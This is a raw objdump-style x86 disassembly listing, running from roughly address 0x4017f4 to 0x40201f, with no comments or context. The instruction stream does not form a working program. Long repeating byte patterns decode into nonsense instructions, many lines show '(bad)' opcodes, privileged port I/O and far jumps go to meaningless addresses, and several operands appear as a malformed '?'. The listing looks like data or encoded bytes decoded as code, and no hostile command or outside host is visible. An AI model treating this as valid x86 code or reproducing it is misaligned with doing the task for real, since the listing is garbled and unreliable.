  4017f4:	push   edi
  4017f5:	push   ebp
  4017f6:	cs inc eax
  4017f8:	pop    edi
  4017f9:	mov    ah,0x34
  4017fb:	xor    al,0x1
  4017fd:	and    ebp,DWORD PTR [esi]
  4017ff:	add    DWORD PTR [eax+0x2b2e40c7],esp
  401805:	mov    edi,0x628cab2f
  40180a:	inc    eax
  40180b:	add    eax,0x40430041
  401810:	inc    eax
  401811:	inc    ecx
  401812:	inc    eax
  401813:	inc    eax
  401814:	bound  eax,QWORD PTR ds:0x5624300
  40181a:	add    BYTE PTR [eax+0x40],al
  40181d:	add    BYTE PTR [ecx+0x43],al
  401820:	add    BYTE PTR [eax+0x41],al
  401823:	add    eax,0x40436200
  401828:	inc    eax
  401829:	add    eax,0x2f481162
  40182e:	add    ebx,0x62a8e803
  401834:	inc    ecx
  401835:	add    edx,edx
  401837:	arpl   WORD PTR [ebx+0x55],ax
  40183a:	pop    edx
  40183b:	jno    0x40189f
  40183d:	inc    eax
  40183e:	add    BYTE PTR [edi+esi*2-0x35],ch
  401842:	pop    edi
  401843:	mov    eax,?
  401845:	dec    edx
  401846:	je     0x4018bd
  401848:	and    al,0x45
  40184a:	mov    al,ds:0x3f4d67c1
  40184f:	ror    BYTE PTR [ebp+0x41],cl
  401852:	inc    eax
  401853:	add    eax,0x41624340
  401858:	test   BYTE PTR [eax],al
  40185a:	and    eax,0x404043
  40185f:	add    BYTE PTR ds:0x626210,al
  401865:	add    eax,0x43404140
  40186a:	inc    eax
  40186b:	inc    ecx
  40186c:	add    eax,0x10664062
  401871:	inc    ebx
  401872:	bound  eax,QWORD PTR [ebx+0x25584cff]
  401878:	add    ah,BYTE PTR [ecx+0x24]
  40187b:	test   BYTE PTR [eax+0x6033c763],al
  401881:	dec    ebx
  401882:	and    eax,0xdd005a63
  401887:	add    eax,0x4041cc
  40188c:	add    BYTE PTR [eax],al
  40188e:	inc    eax
  40188f:	inc    eax
  401890:	inc    ebx
  401891:	bound  eax,QWORD PTR [eax]
  401893:	inc    eax
  401894:	inc    eax
  401895:	add    eax,0x62434162
  40189a:	inc    eax
  40189b:	js     0x4018ad
  40189d:	inc    ecx
  40189e:	add    eax,0x5404325
  4018a3:	bound  eax,QWORD PTR [eax+0x40]
  4018a6:	inc    ecx
  4018a7:	inc    ebx
  4018a8:	das    
  4018a9:	pop    es
  4018aa:	mov    eax,ds:0xa68c4624
  4018af:	inc    eax
  4018b0:	sub    al,0x81
  4018b2:	dec    ebx
  4018b3:	das    
  4018b4:	int3   
  4018b5:	aam    0xa8
  4018b7:	int3   
  4018b8:	and    ebx,DWORD PTR ds:0x5a7c23e0
  4018be:	inc    ebp
  4018bf:	iret   
  4018c0:	and    eax,0x436241
  4018c5:	adc    BYTE PTR [eax+0x0],al
  4018c8:	add    eax,0x62410040
  4018cd:	inc    eax
  4018ce:	add    BYTE PTR [ebx-0x34],al
  4018d1:	inc    eax
  4018d2:	add    eax,0x78434040
  4018d7:	bound  eax,QWORD PTR [ecx+0x78]
  4018da:	add    eax,0x62404043
  4018df:	pusha  
  4018e0:	xor    BYTE PTR ds:0x2a73652e,0x28
  4018e7:	jp     0x401894
  4018e9:	pop    esi
  4018ea:	and    eax,0x511fbfb5
  4018ef:	adc    esp,DWORD PTR cs:[ecx]
  4018f2:	sub    al,0x44
  4018f4:	mov    edi,0x402f9834
  4018f9:	sub    DWORD PTR [edx],esi
  4018fb:	inc    ecx
  4018fc:	inc    eax
  4018fd:	add    eax,0x43436240
  401902:	add    eax,0x62004040
  401907:	inc    eax
  401908:	add    BYTE PTR [ecx+0x40],al
  40190b:	inc    ebx
  40190c:	test   BYTE PTR ds:0x58054041,ah
  401912:	inc    eax
  401913:	inc    eax
  401914:	bound  eax,QWORD PTR [eax+0x66]
  401917:	inc    ecx
  401918:	inc    eax
  401919:	add    eax,0x44bf1700
  40191e:	sub    DWORD PTR [bp+si],edx
  401921:	and    DWORD PTR ds:0xa06a0225,esi
  401927:	xor    al,0x47
  401929:	mov    ebx,0x3cc51e6d
  40192e:	add    eax,0x2d588223
  401933:	adc    al,BYTE PTR [ebx+0x6a]
  401936:	retf   
  401937:	and    eax,0xa832e723
  40193c:	and    BYTE PTR [ebp+0x44],ah
  40193f:	add    BYTE PTR cs:[eax],al
  401942:	inc    ebx
  401943:	inc    eax
  401944:	bound  eax,QWORD PTR ds:0x25404110
  40194a:	add    ah,cl
  40194c:	inc    ebx
  40194d:	add    eax,0x40402562
  401952:	add    BYTE PTR [eax+0x40],al
  401955:	inc    ecx
  401956:	inc    ecx
  401957:	add    eax,0x78434025
  40195c:	bound  eax,QWORD PTR [eax-0x7c]
  40195f:	inc    eax
  401960:	inc    ecx
  401961:	das    
  401962:	push   0x3cf4112f
  401967:	inc    ecx
  401968:	add    DWORD PTR cs:[ecx+0x65444226],esp
  40196f:	push   ss
  401970:	das    
  401971:	inc    eax
  401972:	std    
  401973:	ins    DWORD PTR es:[edi],dx
  401974:	sub    DWORD PTR [esp+esi*1],0x25000368
  40197b:	aaa    
  40197c:	ret    
  40197d:	add    ah,dh
  40197f:	inc    ecx
  401980:	inc    eax
  401981:	inc    eax
  401982:	inc    ebx
  401983:	int3   
  401984:	add    BYTE PTR ds:0x56240,al
  40198a:	inc    ebx
  40198b:	inc    eax
  40198c:	inc    eax
  40198d:	add    BYTE PTR [ecx+0x62],al
  401990:	bound  eax,QWORD PTR [eax]
  401992:	int3   
  401993:	inc    eax
  401994:	inc    ebx
  401995:	add    eax,0x43624041
  40199a:	adc    BYTE PTR [ecx+0x5],al
  40199d:	inc    eax
  40199e:	arpl   WORD PTR [eax+0x22],ax
  4019a1:	or     DWORD PTR [edi],esi
  4019a3:	dec    eax
  4019a4:	aad    0x6f
  4019a6:	js     0x4019e8
  4019a8:	push   esi
  4019a9:	addr16 aaa 
  4019ab:	inc    ebp
  4019ac:	cmp    DWORD PTR ds:0x475d40a8,ecx
  4019b2:	ins    DWORD PTR es:[edi],dx
  4019b3:	xlat   BYTE PTR ds:[ebx]
  4019b4:	out    0x52,al
  4019b6:	iret   
  4019b7:	inc    eax
  4019b8:	add    BYTE PTR [ecx],ah
  4019ba:	cmp    al,ah
  4019bc:	inc    esp
  4019bd:	or     DWORD PTR [edx],ebp
  4019bf:	dec    edx
  4019c0:	xor    BYTE PTR [edx+0x6f],al
  4019c3:	xor    eax,0x4d44522c
  4019c8:	push   ebx
  4019c9:	mov    al,ds:0x467e482e
  4019ce:	es and eax,0x43622c01
  4019d4:	inc    eax
  4019d5:	adc    BYTE PTR ds:0x4158cc40,al
  4019db:	inc    ebx
  4019dc:	bound  eax,QWORD PTR [ecx+0x40]
  4019df:	add    eax,0x4140
  4019e4:	and    eax,0x40400062
  4019e9:	add    eax,0x84404340
  4019ee:	int3   
  4019ef:	js     0x4019f1
  4019f1:	inc    ecx
  4019f2:	adc    BYTE PTR [edx+0xf],ah
  4019f5:	das    
  4019f6:	adc    eax,0x36dddacd
  4019fb:	push   edi
  4019fc:	dec    edx
  4019fd:	sub    DWORD PTR [ebx+0x42],edi
  401a00:	leave  
  401a01:	in     al,0x29
  401a03:	and    BYTE PTR [ecx+0x34],0x51
  401a07:	(bad)  
  401a08:	sub    al,0xa8
  401a0a:	sub    al,0x21
  401a0c:	mov    ebp,0x444221
  401a11:	adc    DWORD PTR [ecx],eax
  401a13:	inc    ebp
  401a14:	cmp    eax,0x4e2c4d23
  401a19:	dec    esp
  401a1a:	ins    DWORD PTR es:[edi],dx
  401a1b:	add    BYTE PTR [ebp+0x3a7c3429],ah
  401a21:	or     BYTE PTR [eax],al
  401a23:	inc    eax
  401a24:	inc    ecx
  401a25:	inc    eax
  401a26:	inc    ebx
  401a27:	bound  ax,DWORD PTR ds:0x40434100
  401a2e:	add    eax,0x40054062
  401a33:	bound  eax,QWORD PTR [ecx+0x40]
  401a36:	inc    ebx
  401a37:	inc    eax
  401a38:	add    eax,0x25405841
  401a3d:	bound  eax,QWORD PTR [eax+0x43]
  401a40:	inc    eax
  401a41:	adc    BYTE PTR [eax],dh
  401a43:	sub    cl,ah
  401a45:	sub    al,0x25
  401a47:	inc    esp
  401a48:	and    DWORD PTR [edx+0x25],eax
  401a4b:	inc    ebx
  401a4c:	and    esi,DWORD PTR [eax]
  401a4e:	xor    al,0xed
  401a50:	test   al,0x10
  401a52:	and    eax,0xe0306101
  401a57:	push   es
  401a58:	data16 sub al,0xb
  401a5b:	cmc    
  401a5c:	push   0x21
  401a5e:	call   0x909:0x60413e4d
  401a65:	pusha  
  401a66:	dec    esp
  401a67:	sub    eax,0x40434140
  401a6c:	add    eax,0x43406262
  401a71:	inc    ecx
  401a72:	adc    BYTE PTR [eax],al
  401a74:	inc    eax
  401a75:	add    eax,0x43000562
  401a7a:	add    BYTE PTR [ecx+0x40],al
  401a7d:	inc    eax
  401a7e:	add    eax,0x400062
  401a83:	inc    ebx
  401a84:	inc    eax
  401a85:	js     0x401ac8
  401a87:	inc    ecx
  401a88:	bound  eax,QWORD PTR [eax-0x74]
  401a8b:	hlt    
  401a8c:	jp     0x401a90
  401a8e:	addr16 jp 0x401a5b
  401a91:	jp     0x401a9f
  401a93:	adc    ebp,DWORD PTR [esi]
  401a95:	pusha  
  401a96:	jecxz  0x401abd
  401a98:	aad    0xd5
  401a9a:	bound  esp,QWORD PTR [eax+0x2f]
  401a9d:	dec    esp
  401a9e:	jmp    0xb55963d3
  401aa3:	push   ebp
  401aa4:	sub    DWORD PTR [ecx],eax
  401aa6:	sub    edi,DWORD PTR [ecx]
  401aa8:	fdivr  st(2),st
  401aaa:	sub    al,0x63
  401aac:	xor    al,0x46
  401aae:	bound  eax,QWORD PTR [eax+0x5]
  401ab1:	inc    ecx
  401ab2:	add    BYTE PTR [ebx+0x40],al
  401ab5:	inc    eax
  401ab6:	inc    ecx
  401ab7:	inc    eax
  401ab8:	inc    eax
  401ab9:	bound  eax,QWORD PTR ds:0x5624300
  401abf:	add    BYTE PTR [eax+0x40],al
  401ac2:	add    BYTE PTR [ecx+0x43],al
  401ac5:	add    BYTE PTR [eax+0x41],al
  401ac8:	add    eax,0x40436200
  401acd:	inc    eax
  401ace:	add    eax,0xb114e362
  401ad3:	dec    eax
  401ad4:	adc    bl,BYTE PTR [ebx+0x6d638723]
  401ada:	bound  edi,QWORD PTR [eax+esi*4]
  401add:	stos   DWORD PTR es:[edi],eax
  401ade:	and    eax,0x4c34e44c
  401ae3:	js     0x401afa
  401ae5:	ucomiss xmm0,DWORD PTR [eax]
  401ae8:	addr16 cs or ch,cl
  401aec:	ins    DWORD PTR es:[edi],dx
  401aed:	loop   0x401b1d
  401aef:	and    DWORD PTR [edi-0x54e234db],ebp
  401af5:	and    DWORD PTR [edi],ebp
  401af7:	cmp    BYTE PTR [eax+0x34],dh
  401afa:	dec    ebp
  401afb:	div    BYTE PTR [esp+ecx*4+0x40054041]
  401b02:	inc    ebx
  401b03:	bound  eax,QWORD PTR [ecx-0x7c]
  401b06:	add    BYTE PTR ds:0x404043,ah
  401b0c:	add    BYTE PTR ds:0x626210,al
  401b12:	add    eax,0x43404140
  401b17:	inc    eax
  401b18:	inc    ecx
  401b19:	add    eax,0x10664062
  401b1e:	inc    ebx
  401b1f:	bound  eax,QWORD PTR [ebx]
  401b21:	xor    BYTE PTR [edi],0x2e
  401b24:	aas    
  401b25:	inc    esp
  401b26:	retf   
  401b27:	popa   
  401b28:	inc    eax
  401b29:	das    
  401b2a:	leave  
  401b2b:	das    
  401b2c:	push   es
  401b2d:	sub    al,0x4d
  401b2f:	bound  eax,QWORD PTR [eax-0x6]
  401b32:	sub    eax,DWORD PTR [ebx]
  401b34:	sub    BYTE PTR [esi+0x63],dh
  401b37:	push   ss
  401b38:	inc    eax
  401b39:	dec    edi
  401b3a:	jnp    0x401b7c
  401b3c:	(bad)  
  401b3d:	lds    esi,FWORD PTR [eax-0x5e7eb550]
  401b43:	dec    eax
  401b44:	test   eax,0x4d620545
  401b49:	add    eax,0x4041cc
  401b4e:	add    BYTE PTR [eax],al
  401b50:	inc    eax
  401b51:	inc    eax
  401b52:	inc    ebx
  401b53:	bound  eax,QWORD PTR [eax]
  401b55:	inc    eax
  401b56:	inc    eax
  401b57:	add    eax,0x62434162
  401b5c:	inc    eax
  401b5d:	js     0x401b6f
  401b5f:	inc    ecx
  401b60:	add    eax,0x5404325
  401b65:	bound  eax,QWORD PTR [eax+0x40]
  401b68:	inc    ecx
  401b69:	inc    ebx
  401b6a:	dec    ecx
  401b6b:	push   ebx
  401b6c:	pusha  
  401b6d:	mov    ah,0xde
  401b6f:	sub    BYTE PTR [esp-0x3bbf9e7e],ah
  401b76:	push   cs
  401b77:	call   0x3740:0x73232515
  401b7e:	and    eax,0x436241
  401b83:	adc    BYTE PTR [eax+0x0],al
  401b86:	add    eax,0x62410040
  401b8b:	inc    eax
  401b8c:	add    BYTE PTR [ebx-0x34],al
  401b8f:	inc    eax
  401b90:	add    eax,0x78434040
  401b95:	bound  eax,QWORD PTR [ecx+0x78]
  401b98:	add    eax,0x62404043
  401b9d:	clc    
  401b9e:	(bad)  
  401b9f:	retf   
  401ba0:	and    al,0x4c
  401ba2:	and    BYTE PTR [eax+0x62],dl
  401ba5:	je     0x401b69
  401ba7:	push   esp
  401ba8:	das    
  401ba9:	add    al,0x2f
  401bab:	or     BYTE PTR [esi+ebx*8-0x60],cl
  401baf:	xor    esp,DWORD PTR [ebx]
  401bb1:	and    DWORD PTR [edx+0x40],ecx
  401bb4:	pushf  
  401bb5:	bound  esp,QWORD PTR [ebx-0x64]
  401bb8:	cs inc edi
  401bba:	jmp    0x4215651f
  401bbf:	inc    eax
  401bc0:	add    eax,0x43436240
  401bc5:	add    eax,0x62004040
  401bca:	inc    eax
  401bcb:	add    BYTE PTR [ecx+0x40],al
  401bce:	inc    ebx
  401bcf:	test   BYTE PTR ds:0x58054041,ah
  401bd5:	inc    eax
  401bd6:	inc    eax
  401bd7:	bound  eax,QWORD PTR [eax+0x66]
  401bda:	inc    ecx
  401bdb:	inc    eax
  401bdc:	add    eax,0x250d6500
  401be1:	add    DWORD PTR [eax-0x7ede9bd],edx
  401be7:	jnp    0x401c15
  401be9:	jo     0x401c4e
  401beb:	vpunpcklqdq xmm4,xmm4,XMMWORD PTR [edx+esi*1+0x636abb01]
  401bf5:	lahf   
  401bf6:	push   0xd
  401bf8:	xor    eax,0x4f406f52
  401bfd:	pop    eax
  401bfe:	nop
  401bff:	retf   
  401c00:	ins    DWORD PTR es:[edi],dx
  401c01:	add    DWORD PTR [ecx-0x73],esp
  401c04:	push   es
  401c05:	add    BYTE PTR [eax],al
  401c07:	inc    ebx
  401c08:	inc    eax
  401c09:	bound  eax,QWORD PTR ds:0x25404110
  401c0f:	add    ah,cl
  401c11:	inc    ebx
  401c12:	add    eax,0x40402562
  401c17:	add    BYTE PTR [eax+0x40],al
  401c1a:	inc    ecx
  401c1b:	inc    ecx
  401c1c:	add    eax,0x78434025
  401c21:	bound  eax,QWORD PTR [eax-0x7c]
  401c24:	inc    eax
  401c25:	inc    ecx
  401c26:	pop    edx
  401c27:	push   ebp
  401c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c29:	sub    eax,0xe16a6697
  401c2e:	int    0xd7
  401c30:	dec    ecx
  401c31:	xor    dl,BYTE PTR [ebp+0x21]
  401c34:	inc    eax
  401c35:	arpl   WORD PTR ds:0x812fcfdc,dx
  401c3b:	jg     0x401bf9
  401c3d:	push   ebp
  401c3e:	stc    
  401c3f:	gs aam 0x26
  401c42:	or     al,0xa1
  401c44:	dec    ecx
  401c45:	xor    al,0x44
  401c47:	mov    eax,0x45d76da4
  401c4c:	fdiv   QWORD PTR [ebx+0x2c]
  401c4f:	clc    
  401c50:	cli    
  401c51:	aaa    
  401c52:	add    esp,DWORD PTR [ebx-0x678fc1b6]
  401c58:	xor    eax,0x4103c137
  401c5d:	inc    eax
  401c5e:	inc    eax
  401c5f:	inc    ebx
  401c60:	int3   
  401c61:	add    BYTE PTR ds:0x56240,al
  401c67:	inc    ebx
  401c68:	inc    eax
  401c69:	inc    eax
  401c6a:	add    BYTE PTR [ecx+0x62],al
  401c6d:	bound  eax,QWORD PTR [eax]
  401c6f:	int3   
  401c70:	inc    eax
  401c71:	inc    ebx
  401c72:	add    eax,0x43624041
  401c77:	adc    BYTE PTR [ecx+0x5],al
  401c7a:	inc    eax
  401c7b:	inc    eax
  401c7c:	pop    ebx
  401c7d:	lds    eax,FWORD PTR ds:0xa51d37f1
  401c83:	dec    ebp
  401c84:	xor    al,0x12
  401c86:	xchg   DWORD PTR [ebp+ebp*2+0x4c40c4c1],ebx
  401c8d:	cmp    BYTE PTR [edx-0x7b],0x38
  401c91:	adc    BYTE PTR [eax-0x7060cdd1],ch
  401c97:	int3   
  401c98:	outs   dx,DWORD PTR ds:[esi]
  401c99:	shr    BYTE PTR [ecx],0x40
  401c9c:	hlt    
  401c9d:	pop    eax
  401c9e:	push   0x7e142e62
  401ca3:	inc    eax
  401ca4:	inc    esp
  401ca5:	pop    edx
  401ca6:	adc    ebp,DWORD PTR [ecx+0x4025162f]
  401cac:	jge    0x401c83
  401cae:	bound  eax,QWORD PTR [ebx+0x40]
  401cb1:	adc    BYTE PTR ds:0x4158cc40,al
  401cb7:	inc    ebx
  401cb8:	bound  eax,QWORD PTR [ecx+0x40]
  401cbb:	add    eax,0x4140
  401cc0:	and    eax,0x40400062
  401cc5:	add    eax,0x84404340
  401cca:	int3   
  401ccb:	js     0x401ccd
  401ccd:	inc    ecx
  401cce:	adc    BYTE PTR [edx+0xf],ah
  401cd1:	cmp    eax,0xbdc12942
  401cd6:	outs   dx,DWORD PTR ds:[esi]
  401cd7:	push   0x34d5754a
  401cdc:	(bad)  
  401cdd:	outs   dx,DWORD PTR ds:[esi]
  401cde:	inc    ecx
  401cdf:	xor    ch,cl
  401ce1:	popa   
  401ce2:	inc    ebp
  401ce3:	and    esp,eax
  401ce5:	and    DWORD PTR [ecx+0x52041f3c],ebp
  401ceb:	and    edi,DWORD PTR [ebx+0x446ad428]
  401cf1:	arpl   WORD PTR [eax+0x62657329],bp
  401cf7:	pusha  
  401cf8:	sub    eax,0x402c1244
  401cfd:	sbb    eax,DWORD PTR [eax]
  401cff:	inc    eax
  401d00:	inc    ecx
  401d01:	inc    eax
  401d02:	inc    ebx
  401d03:	bound  ax,DWORD PTR ds:0x40434100
  401d0a:	add    eax,0x40054062
  401d0f:	bound  eax,QWORD PTR [ecx+0x40]
  401d12:	inc    ebx
  401d13:	inc    eax
  401d14:	add    eax,0x25405841
  401d19:	bound  eax,QWORD PTR [eax+0x43]
  401d1c:	inc    eax
  401d1d:	adc    BYTE PTR [eax-0x18],al
  401d20:	ins    BYTE PTR es:[edi],dx
  401d21:	xor    al,0x94
  401d23:	xor    BYTE PTR [ecx+0x27],dh
  401d26:	push   0x67
  401d28:	int    0x98
  401d2a:	adc    eax,0x6f23da30
  401d2f:	dec    esp
  401d30:	cs (bad) 
  401d32:	retf   
  401d33:	and    edx,eax
  401d35:	in     eax,0x6a
  401d37:	adc    DWORD PTR [esi+0x3a604c45],edx
  401d3d:	push   esi
  401d3e:	inc    ecx
  401d3f:	leave  
  401d40:	mov    edi,0x407a3663
  401d45:	loope  0x401d8e
  401d47:	scas   eax,DWORD PTR es:[edi]
  401d48:	mov    edi,0x2925814d
  401d4d:	loope  0x401cdb
  401d4f:	out    dx,eax
  401d50:	mov    edi,0x41407b7c
  401d55:	inc    ebx
  401d56:	inc    eax
  401d57:	add    eax,0x43406262
  401d5c:	inc    ecx
  401d5d:	adc    BYTE PTR [eax],al
  401d5f:	inc    eax
  401d60:	add    eax,0x43000562
  401d65:	add    BYTE PTR [ecx+0x40],al
  401d68:	inc    eax
  401d69:	add    eax,0x400062
  401d6e:	inc    ebx
  401d6f:	inc    eax
  401d70:	js     0x401db3
  401d72:	inc    ecx
  401d73:	bound  eax,QWORD PTR [eax+0x30]
  401d76:	(bad)  [ebp+eiz*2-0x54]
  401d7a:	push   0x2d
  401d7c:	inc    ecx
  401d7d:	cmp    ecx,eax
  401d7f:	xor    eax,DWORD PTR [eax+0x6d]
  401d82:	lds    esp,FWORD PTR [ebx-0x7f]
  401d85:	adc    al,0x51
  401d87:	in     eax,0x5d
  401d89:	dec    ecx
  401d8a:	inc    edx
  401d8b:	pop    eax
  401d8c:	ret    
  401d8d:	ins    DWORD PTR es:[edi],dx
  401d8e:	dec    ebx
  401d8f:	and    eax,0xdc47626a
  401d94:	test   al,0x34
  401d96:	lds    edi,FWORD PTR [ebp-0x5c13b3be]
  401d9c:	or     eax,0xbc590a2e
  401da1:	cmp    BYTE PTR [eax-0x76],cl
  401da4:	retf   
  401da5:	and    eax,0xc34021c1
  401daa:	cmp    al,0xc2
  401dac:	inc    esp
  401dad:	bound  eax,QWORD PTR [eax+0x5]
  401db0:	inc    ecx
  401db1:	add    BYTE PTR [ebx+0x40],al
  401db4:	inc    eax
  401db5:	inc    ecx
  401db6:	inc    eax
  401db7:	inc    eax
  401db8:	bound  eax,QWORD PTR ds:0x5624300
  401dbe:	add    BYTE PTR [eax+0x40],al
  401dc1:	add    BYTE PTR [ecx+0x43],al
  401dc4:	add    BYTE PTR [eax+0x41],al
  401dc7:	add    eax,0x40436200
  401dcc:	inc    eax
  401dcd:	add    eax,0x3ccf3462
  401dd2:	mov    esp,0x4fae68bc
  401dd7:	cs (bad) 
  401dd9:	mov    eax,ds:0x62d54140
  401dde:	inc    ebp
  401ddf:	das    
  401de0:	or     ah,BYTE PTR [edi+0x14]
  401de3:	mov    ds:0x33ccb41,eax
  401de8:	(bad)  
  401de9:	and    al,BYTE PTR [ebp-0x60]
  401dec:	out    dx,al
  401ded:	inc    esp
  401dee:	sub    DWORD PTR [eax+0x49],eax
  401df1:	and    esp,DWORD PTR [edx+0x62]
  401df4:	adc    al,0x5d
  401df6:	push   0x726dce48
  401dfb:	leave  
  401dfc:	cmp    BYTE PTR [edx+0x41],dh
  401dff:	inc    eax
  401e00:	add    eax,0x41624340
  401e05:	test   BYTE PTR [eax],al
  401e07:	and    eax,0x404043
  401e0c:	add    BYTE PTR ds:0x626210,al
  401e12:	add    eax,0x43404140
  401e17:	inc    eax
  401e18:	inc    ecx
  401e19:	add    eax,0x10664062
  401e1e:	inc    ebx
  401e1f:	bound  eax,QWORD PTR [ecx+0x40]
  401e22:	xor    ah,cl
  401e24:	jo     0x401e72
  401e26:	pop    edx
  401e27:	push   edx
  401e28:	jp     0x401e6a
  401e2a:	add    ebx,DWORD PTR [ebp+eiz*2+0x11]
  401e2e:	inc    bx
  401e30:	imul   eax,DWORD PTR [eax-0x31],0xcdcb4527
  401e37:	adc    BYTE PTR [eax+0x40],ch
  401e3a:	je     0x401e94
  401e3c:	mov    edi,0x345213bc
  401e41:	inc    eax
  401e42:	(bad)  
  401e43:	loope  0x401e1e
  401e45:	inc    edx
  401e46:	repnz pop ss
  401e48:	inc    eax
  401e49:	inc    eax
  401e4a:	mov    ebx,0x4041cc05
  401e4f:	add    BYTE PTR [eax],al
  401e51:	add    BYTE PTR [eax+0x40],al
  401e54:	inc    ebx
  401e55:	bound  eax,QWORD PTR [eax]
  401e57:	inc    eax
  401e58:	inc    eax
  401e59:	add    eax,0x62434162
  401e5e:	inc    eax
  401e5f:	js     0x401e71
  401e61:	inc    ecx
  401e62:	add    eax,0x5404325
  401e67:	bound  eax,QWORD PTR [eax+0x40]
  401e6a:	inc    ecx
  401e6b:	inc    ebx
  401e6c:	fmul   DWORD PTR [eax+0x33]
  401e6f:	(bad)  
  401e70:	enter  0x9994,0x6f
  401e74:	mov    eax,ds:0x627024f0
  401e79:	cmp    eax,0x9faf73aa
  401e7e:	mov    esp,0x7cc3d65b
  401e83:	les    esp,FWORD PTR ds:0x436241
  401e89:	adc    BYTE PTR [eax+0x0],al
  401e8c:	add    eax,0x62410040
  401e91:	inc    eax
  401e92:	add    BYTE PTR [ebx-0x34],al
  401e95:	inc    eax
  401e96:	add    eax,0x78434040
  401e9b:	bound  eax,QWORD PTR [ecx+0x78]
  401e9e:	add    eax,0x62404043
  401ea3:	enter  0x541,0xc5
  401ea7:	mov    esi,0xe56f9b94
  401eac:	inc    eax
  401ead:	leave  
  401eae:	sub    DWORD PTR [ebp+edx*1-0x6e],ecx
  401eb2:	outs   dx,DWORD PTR ds:[esi]
  401eb3:	inc    esp
  401eb4:	int3   
  401eb5:	inc    ecx
  401eb6:	cdq    
  401eb7:	(bad)  
  401eb8:	leave  
  401eb9:	adc    eax,0x3742e5c0
  401ebe:	lea    eax,[ecx+0x40]
  401ec1:	add    eax,0x43436240
  401ec6:	add    eax,0x62004040
  401ecb:	inc    eax
  401ecc:	add    BYTE PTR [ecx+0x40],al
  401ecf:	inc    ebx
  401ed0:	test   BYTE PTR ds:0x58054041,ah
  401ed6:	inc    eax
  401ed7:	inc    eax
  401ed8:	bound  eax,QWORD PTR [eax+0x66]
  401edb:	inc    ecx
  401edc:	inc    eax
  401edd:	add    eax,0xc841fa00
  401ee2:	jg     0x401f47
  401ee4:	cmp    cl,ah
  401ee6:	fs mov esp,0xe8281248
  401eec:	sbb    BYTE PTR [esi+0x5b],ch
  401eef:	data16 adc al,0xc7
  401ef2:	shr    DWORD PTR [ecx],0x40
  401ef5:	xor    al,0xf
  401ef7:	ret    
  401ef8:	int    0x8e
  401efa:	inc    edx
  401efb:	dec    esi
  401efc:	jb     0x401f40
  401efe:	fsubr  DWORD PTR [eax+ebp*4]
  401f01:	mov    al,al
  401f03:	and    DWORD PTR [eax-0x61],eax
  401f06:	pop    esp
  401f07:	bound  ecx,QWORD PTR ds:0x707326a8
  401f0d:	inc    edx
  401f0e:	lea    edx,[eax+0x0]
  401f11:	add    BYTE PTR [ebx+0x40],al
  401f14:	bound  eax,QWORD PTR ds:0x25404110
  401f1a:	add    ah,cl
  401f1c:	inc    ebx
  401f1d:	add    eax,0x40402562
  401f22:	add    BYTE PTR [eax+0x40],al
  401f25:	inc    ecx
  401f26:	inc    ecx
  401f27:	add    eax,0x78434025
  401f2c:	bound  eax,QWORD PTR [eax-0x7c]
  401f2f:	inc    eax
  401f30:	inc    ecx
  401f31:	retf   
  401f32:	rcl    DWORD PTR [esi],1
  401f34:	and    DWORD PTR [eax+0x24],eax
  401f37:	fs or  al,0x4d
  401f3a:	popa   
  401f3b:	inc    esi
  401f3c:	add    DWORD PTR [ebp-0x1d],esp
  401f3f:	pop    ebx
  401f40:	stc    
  401f41:	inc    edx
  401f42:	xchg   esi,eax
  401f43:	shl    DWORD PTR [ecx],0x40
  401f46:	dec    esi
  401f47:	int    0x62
  401f49:	cwde   
  401f4a:	push   0xfd401a7c
  401f4f:	pop    es
  401f50:	outs   dx,DWORD PTR ds:[esi]
  401f51:	or     eax,0x4023c040
  401f56:	dec    eax
  401f57:	(bad)
  401f5a:	inc    eax
  401f5b:	xor    al,0xaf
  401f5d:	ds test al,0xf
  401f60:	push   ebx
  401f61:	add    DWORD PTR [ecx+0x40],eax
  401f64:	inc    eax
  401f65:	inc    ebx
  401f66:	int3   
  401f67:	add    BYTE PTR ds:0x56240,al
  401f6d:	inc    ebx
  401f6e:	inc    eax
  401f6f:	inc    eax
  401f70:	add    BYTE PTR [ecx+0x62],al
  401f73:	bound  eax,QWORD PTR [eax]
  401f75:	int3   
  401f76:	inc    eax
  401f77:	inc    ebx
  401f78:	add    eax,0x43624041
  401f7d:	adc    BYTE PTR [ecx+0x5],al
  401f80:	inc    eax
  401f81:	inc    eax
  401f82:	push   ecx
  401f83:	inc    ecx
  401f84:	dec    eax
  401f85:	push   eax
  401f86:	lea    edx,[edx+0x65c24035]
  401f8c:	inc    eax
  401f8d:	sub    ah,BYTE PTR [ebp+0x73]
  401f90:	mov    WORD PTR ds:0x4f2c6536,?
  401f96:	bound  eax,QWORD PTR [ebx+0x40]
  401f99:	adc    BYTE PTR ds:0x4158cc40,al
  401f9f:	inc    ebx
  401fa0:	bound  eax,QWORD PTR [ecx+0x40]
  401fa3:	add    eax,0x4140
  401fa8:	and    eax,0x40400062
  401fad:	add    eax,0x84404340
  401fb2:	int3   
  401fb3:	js     0x401fb5
  401fb5:	inc    ecx
  401fb6:	adc    BYTE PTR [edx+0xf],ah
  401fb9:	pop    esp
  401fba:	push   0xe140ec05
  401fbf:	inc    eax
  401fc0:	xor    eax,0x237bea14
  401fc5:	pusha  
  401fc6:	fiadd  WORD PTR [eax+0x40]
  401fc9:	mov    WORD PTR [ebx+0x48],fs
  401fcc:	loope  0x401fd9
  401fce:	jmp    0x402010
  401fd0:	inc    eax
  401fd1:	pop    ebp
  401fd2:	inc    ebp
  401fd3:	inc    ebp
  401fd4:	enter  0x1cc0,0x3c
  401fd8:	add    DWORD PTR [edi-0x6ef0afc4],edi
  401fde:	imul   eax,DWORD PTR [ecx-0x55],0xffffffbf
  401fe2:	sub    esi,DWORD PTR [edi+edi*2]
  401fe5:	and    DWORD PTR [edx*2+0x40414000],ecx
  401fec:	inc    ebx
  401fed:	bound  ax,DWORD PTR ds:0x40434100
  401ff4:	add    eax,0x40054062
  401ff9:	bound  eax,QWORD PTR [ecx+0x40]
  401ffc:	inc    ebx
  401ffd:	inc    eax
  401ffe:	add    eax,0x25405841
  402003:	bound  eax,QWORD PTR [eax+0x43]
  402006:	inc    eax
  402007:	adc    al,dh
  402009:	mov    edi,0x48125ba0
  40200e:	sub    DWORD PTR [eax],esi
  402010:	jge    0x40206e
  402012:	bound  edi,QWORD PTR [eax+0x4004c0d5]
  402018:	ret    
  402019:	aad    0x46
  40201b:	inc    ecx
  40201c:	lods   eax,DWORD PTR ds:[esi]
  40201d:	das    
  40201e:	daa    
  40201f:	dec    esp
